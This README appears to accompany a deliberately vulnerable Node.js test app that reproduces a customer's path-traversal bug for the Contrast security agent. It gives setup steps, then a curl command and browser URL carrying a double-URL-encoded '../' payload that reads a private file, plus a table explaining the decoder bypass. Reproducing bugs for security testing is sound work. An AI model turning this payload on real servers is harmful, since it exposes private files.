# Introduction
This is a vulnerable application created to replicate a vulnerability found in a customer app.

# Requirements
* node v16.14.0 (npm v8.3.1)
* @contrast/agent 4.11.0

# Installation
1. Run the following to install all app dependencies, including the Contrast agent.
    ```bash
    npm install
    ```

2. Download the `contrast_security.yaml` file and place in the root directory.

# Run
Run the following. Already has Contrast agent require statement included.
```bash
npm start
```
Application will be available at:
```
http://localhost:3000
```

# Exploit
## Option 1: Curl Request Exploit
Run the following command to exploit the app. This will access a normally private file using Path Traversal.
```bash
curl http://localhost:3000/public/%252E%252E%252Fprivate%252Fprivate.txt
```

## Option 2: Exploit in Browser
```
http://localhost:3000/public/%252E%252E%252Fprivate%252Fprivate.txt
```

# Additional Info
This exploit uses double URL Encoding to bypass a single pass URL decoder:

| Encoding           | Value              | 
| ------------------ | ------------------ | 
| Unencoded          | `../`              |
| URL Encoded        | `%2E%2E%2F`        |
| Double URL Encoded | `%252E%252E%252F`  |
